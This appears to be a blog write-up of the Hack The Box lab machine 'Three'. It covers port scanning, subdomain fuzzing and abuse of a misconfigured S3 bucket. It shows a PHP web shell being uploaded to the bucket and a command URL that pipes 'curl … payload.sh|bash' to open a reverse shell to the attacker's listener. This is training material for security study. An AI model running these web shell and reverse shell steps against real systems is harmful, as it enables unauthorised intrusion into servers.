---
layout: single
title: 'Three'
excerpt: 'Three is a very easy Linux machine featuring a website using a misconfigured AWS S3 bucket as its cloud-storage device. The machine explores web application enumeration and subdomain fuzzing to detect the hidden domain corresponding to the S3 bucket. Then it showcases using the AWS command line interface to access the vulnerable S3 bucket as well as how to exploit it by uploading and triggering a reverse shell.'
date: 2026-06-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-three/three_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-1-Fundamental-Exploitation
os: Linux
difficulty: Very Easy
release: 2022-08-03
ip: 10.129.142.67
---

{% include info-card.html %}

## Tools

- [GoBuster](https://github.com/Oj/gobuster)
- [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html#getting-started-install-instructions)
- [NetCat](https://sectools.org/tool/netcat/)

## Task 1

![Task 1](/assets/images/htb-writeup-three/Task 1.png)

<pre class="language-"><code class="language-">
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.227.248 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-29 23:43 -05
Initiating Ping Scan at 23:43
Scanning 10.129.227.248 [4 ports]
Completed Ping Scan at 23:43, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:43
Scanning 10.129.227.248 [65535 ports]
Discovered open port 80/tcp on 10.129.227.248
Discovered open port 22/tcp on 10.129.227.248
Completed SYN Stealth Scan at 23:43, 13.67s elapsed (65535 total ports)
Nmap scan report for 10.129.227.248
Host is up, received reset ttl 63 (0.100s latency).
Scanned at 2026-06-29 23:43:13 -05 for 14s
Not shown: 65413 closed tcp ports (reset), 120 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
<span style="color: #bb66ff;">22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63</span>

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
           Raw packets sent: 67303 (2.961MB) | Rcvd: 66344 (2.654MB)
</code></pre>

## Task 2

![Task 2](/assets/images/htb-writeup-three/Task 2.png)

![Contact Email](/assets/images/htb-writeup-three/Contact%20Email.png)

## Task 3

![Task 3](/assets/images/htb-writeup-three/Task 3.png)

<pre class="language-"><code class="language-">
❯ cat /etc/hosts
─────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: /etc/hosts
─────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ 127.0.0.1   localhost
   2 │ 127.0.1.1   medinaz0
   3 │ 
   4 │ # The following lines are desirable for IPv6 capable hosts
   5 │ ::1     ip6-localhost ip6-loopback
   6 │ fe00::0 ip6-localnet
   7 │ ff00::0 ip6-mcastprefix
   8 │ ff02::1 ip6-allnodes
   9 │ ff02::2 ip6-allrouters
  10 │ 
  11 │ 10.129.227.248  thetoppers.htb
─────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre>

## Task 4

![Task 4](/assets/images/htb-writeup-three/Task 4.png)

<pre class="language-"><code class="language-">
❯ gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://thetoppers.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
<span style="color: #bb66ff;">s3.thetoppers.htb Status: 404 [Size: 21]</span>
Progress: 5000 / 5000 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

## Task 5

![Task 5](/assets/images/htb-writeup-three/Task 5.png)

## Task 6

![Task 6](/assets/images/htb-writeup-three/Task 6.png)

## Task 7

![Task 7](/assets/images/htb-writeup-three/Task 7.png)

<pre class="language-"><code class="language-">
❯ aws configure

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: test
Default output format [None]: test
</code></pre>

## Task 8

![Task 8](/assets/images/htb-writeup-three/Task 8.png)

<pre class="language-"><code class="language-">
❯ aws s3 ls --endpoint=http://s3.thetoppers.htb
2026-06-29 23:23:17 thetoppers.htb
❯ aws s3 ls --endpoint=http://s3.thetoppers.htb s3://thetoppers.htb
                           PRE images/
2026-06-29 23:23:17          0 .htaccess
2026-06-29 23:23:17      11952 index.php
</code></pre>

## Task 9

![Task 9](/assets/images/htb-writeup-three/Task 9.png)

## Submit Flag

I'm going to proceed to make a PHP file to get an RCE.

![PHP Code](/assets/images/htb-writeup-three/php%20code.png)

<pre class="language-"><code class="language-">
❯ aws s3 --endpoint=http://s3.thetoppers.htb cp RCE.php s3://thetoppers.htb
upload: ./RCE.php to s3://thetoppers.htb/RCE.php                 
</code></pre>

So now I can access the RCE.php file.

![RCE 1](/assets/images/htb-writeup-three/RCE%201.png)

I'm going to make a `payload.sh` to gain a reverse shell to the machine.

![Payload](/assets/images/htb-writeup-three/Payload.png)

Also I'm going to open an HTTP server with Python in the same directory where I have the `payload.sh`, and start a listener with [NetCat](https://sectools.org/tool/netcat/) on port 443

![RCE 2](/assets/images/htb-writeup-three/RCE%202.png)

I go to the web and use this URL `http://thetoppers.htb/RCE.php?cmd=curl%2010.10.15.165:8000/payload.sh|bash`. This makes a curl request to my Python HTTP server and runs the script, granting me access to the machine.

![RCE 3](/assets/images/htb-writeup-three/RCE%203.png)

<pre class="language-"><code class="language-">
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt   
cat flag.txt
<span style="color: #bb66ff;">a980d99281a28d638ac68b9bf9453c2b</span>
www-data@three:/var/www$ 
</code></pre>

![Submit Flag](/assets/images/htb-writeup-three/Submit Flag.png)

![You have solved Three!](/assets/images/htb-writeup-three/You have solved Three!.png)
